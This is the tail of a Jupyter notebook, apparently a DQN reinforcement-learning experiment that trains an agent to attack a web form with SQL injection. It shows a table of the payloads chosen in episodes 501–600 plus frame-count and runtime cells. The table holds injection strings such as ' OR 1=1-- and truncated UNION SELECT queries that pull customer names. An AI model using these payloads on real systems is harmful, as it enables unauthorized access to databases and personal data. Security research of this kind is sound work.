       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 554</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 555</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 556</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 557</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 558</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 559</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 560</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 561</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 562</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 563</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 564</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 565</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 566</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 567</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 568</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 569</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 570</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 571</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 572</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 573</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 574</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 575</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 576</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 577</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 578</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 579</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 580</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 581</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 582</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 583</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 584</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 585</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 586</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 587</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 588</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 589</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 590</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 591</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 592</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 593</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 594</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 595</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 596</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 597</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' UNION SELECT customer_id, first_name, last_n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 598</th>\n",
       "      <td>' OR 1=1--</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 599</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Episode 600</th>\n",
       "      <td>' UNION SELECT product_id, product_name, brand...</td>\n",
       "      <td>' OR 1=1--</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                     Context 1  \\\n",
       "Episode 501                                        ' OR 1=1--    \n",
       "Episode 502  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 503  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 504                                        ' OR 1=1--    \n",
       "Episode 505                                        ' OR 1=1--    \n",
       "Episode 506  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 507  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 508  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 509  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 510  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 511                                        ' OR 1=1--    \n",
       "Episode 512                                        ' OR 1=1--    \n",
       "Episode 513                                        ' OR 1=1--    \n",
       "Episode 514  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 515                                        ' OR 1=1--    \n",
       "Episode 516                                        ' OR 1=1--    \n",
       "Episode 517                                        ' OR 1=1--    \n",
       "Episode 518  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 519                                        ' OR 1=1--    \n",
       "Episode 520  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 521  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 522  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 523                                        ' OR 1=1--    \n",
       "Episode 524  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 525  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 526  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 527  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 528                                        ' OR 1=1--    \n",
       "Episode 529  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 530                                        ' OR 1=1--    \n",
       "Episode 531  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 532  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 533                                        ' OR 1=1--    \n",
       "Episode 534  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 535                                        ' OR 1=1--    \n",
       "Episode 536  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 537  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 538  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 539                                        ' OR 1=1--    \n",
       "Episode 540  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 541  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 542  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 543                                        ' OR 1=1--    \n",
       "Episode 544  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 545                                        ' OR 1=1--    \n",
       "Episode 546  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 547                                        ' OR 1=1--    \n",
       "Episode 548  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 549                                        ' OR 1=1--    \n",
       "Episode 550                                        ' OR 1=1--    \n",
       "Episode 551                                        ' OR 1=1--    \n",
       "Episode 552  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 553  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 554  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 555  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 556                                        ' OR 1=1--    \n",
       "Episode 557  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 558  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 559                                        ' OR 1=1--    \n",
       "Episode 560                                        ' OR 1=1--    \n",
       "Episode 561                                        ' OR 1=1--    \n",
       "Episode 562  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 563                                        ' OR 1=1--    \n",
       "Episode 564  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 565  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 566                                        ' OR 1=1--    \n",
       "Episode 567                                        ' OR 1=1--    \n",
       "Episode 568                                        ' OR 1=1--    \n",
       "Episode 569                                        ' OR 1=1--    \n",
       "Episode 570                                        ' OR 1=1--    \n",
       "Episode 571                                        ' OR 1=1--    \n",
       "Episode 572                                        ' OR 1=1--    \n",
       "Episode 573  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 574                                        ' OR 1=1--    \n",
       "Episode 575                                        ' OR 1=1--    \n",
       "Episode 576                                        ' OR 1=1--    \n",
       "Episode 577  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 578  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 579  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 580                                        ' OR 1=1--    \n",
       "Episode 581                                        ' OR 1=1--    \n",
       "Episode 582  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 583                                        ' OR 1=1--    \n",
       "Episode 584                                        ' OR 1=1--    \n",
       "Episode 585  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 586                                        ' OR 1=1--    \n",
       "Episode 587                                        ' OR 1=1--    \n",
       "Episode 588                                        ' OR 1=1--    \n",
       "Episode 589                                        ' OR 1=1--    \n",
       "Episode 590  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 591                                        ' OR 1=1--    \n",
       "Episode 592                                        ' OR 1=1--    \n",
       "Episode 593  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 594                                        ' OR 1=1--    \n",
       "Episode 595  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 596                                        ' OR 1=1--    \n",
       "Episode 597                                        ' OR 1=1--    \n",
       "Episode 598                                        ' OR 1=1--    \n",
       "Episode 599  ' UNION SELECT product_id, product_name, brand...   \n",
       "Episode 600  ' UNION SELECT product_id, product_name, brand...   \n",
       "\n",
       "                                                     Context 2  \n",
       "Episode 501  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 502                                        ' OR 1=1--   \n",
       "Episode 503                                        ' OR 1=1--   \n",
       "Episode 504  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 505  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 506  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 507  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 508                                        ' OR 1=1--   \n",
       "Episode 509                                        ' OR 1=1--   \n",
       "Episode 510  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 511  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 512                                        ' OR 1=1--   \n",
       "Episode 513                                        ' OR 1=1--   \n",
       "Episode 514                                        ' OR 1=1--   \n",
       "Episode 515                                        ' OR 1=1--   \n",
       "Episode 516  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 517  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 518                                        ' OR 1=1--   \n",
       "Episode 519  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 520                                        ' OR 1=1--   \n",
       "Episode 521                                        ' OR 1=1--   \n",
       "Episode 522                                        ' OR 1=1--   \n",
       "Episode 523  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 524                                        ' OR 1=1--   \n",
       "Episode 525  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 526                                        ' OR 1=1--   \n",
       "Episode 527  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 528  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 529  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 530                                        ' OR 1=1--   \n",
       "Episode 531  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 532                                        ' OR 1=1--   \n",
       "Episode 533                                        ' OR 1=1--   \n",
       "Episode 534  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 535  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 536  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 537  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 538                                        ' OR 1=1--   \n",
       "Episode 539  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 540                                        ' OR 1=1--   \n",
       "Episode 541  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 542                                        ' OR 1=1--   \n",
       "Episode 543                                        ' OR 1=1--   \n",
       "Episode 544  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 545                                        ' OR 1=1--   \n",
       "Episode 546                                        ' OR 1=1--   \n",
       "Episode 547                                        ' OR 1=1--   \n",
       "Episode 548  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 549  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 550                                        ' OR 1=1--   \n",
       "Episode 551  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 552  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 553  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 554                                        ' OR 1=1--   \n",
       "Episode 555  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 556                                        ' OR 1=1--   \n",
       "Episode 557  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 558                                        ' OR 1=1--   \n",
       "Episode 559                                        ' OR 1=1--   \n",
       "Episode 560                                        ' OR 1=1--   \n",
       "Episode 561                                        ' OR 1=1--   \n",
       "Episode 562                                        ' OR 1=1--   \n",
       "Episode 563  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 564                                        ' OR 1=1--   \n",
       "Episode 565  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 566  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 567                                        ' OR 1=1--   \n",
       "Episode 568  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 569  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 570                                        ' OR 1=1--   \n",
       "Episode 571                                        ' OR 1=1--   \n",
       "Episode 572  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 573  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 574                                        ' OR 1=1--   \n",
       "Episode 575                                        ' OR 1=1--   \n",
       "Episode 576  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 577                                        ' OR 1=1--   \n",
       "Episode 578                                        ' OR 1=1--   \n",
       "Episode 579                                        ' OR 1=1--   \n",
       "Episode 580                                        ' OR 1=1--   \n",
       "Episode 581                                        ' OR 1=1--   \n",
       "Episode 582                                        ' OR 1=1--   \n",
       "Episode 583                                        ' OR 1=1--   \n",
       "Episode 584                                        ' OR 1=1--   \n",
       "Episode 585  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 586                                        ' OR 1=1--   \n",
       "Episode 587  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 588                                        ' OR 1=1--   \n",
       "Episode 589                                        ' OR 1=1--   \n",
       "Episode 590  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 591                                        ' OR 1=1--   \n",
       "Episode 592                                        ' OR 1=1--   \n",
       "Episode 593  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 594  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 595  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 596                                        ' OR 1=1--   \n",
       "Episode 597  ' UNION SELECT customer_id, first_name, last_n...  \n",
       "Episode 598                                        ' OR 1=1--   \n",
       "Episode 599                                        ' OR 1=1--   \n",
       "Episode 600                                        ' OR 1=1--   "
      ]
     },
     "execution_count": 52,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "pd.set_option('display.max_rows', 1000)\n",
    "df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Total frame counts: 359040\n"
     ]
    }
   ],
   "source": [
    "print(f'Total frame counts: {frame_count}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Approximate time taken (s): 7266.6652162s\n"
     ]
    }
   ],
   "source": [
    "print(f'DQN runtime: {analytics.analytics_run_time}s')"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.4 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.4"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "844694dc4390c811ac8b4d2fcaa7d18288efc8c697b009159baa2dd36f994a81"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
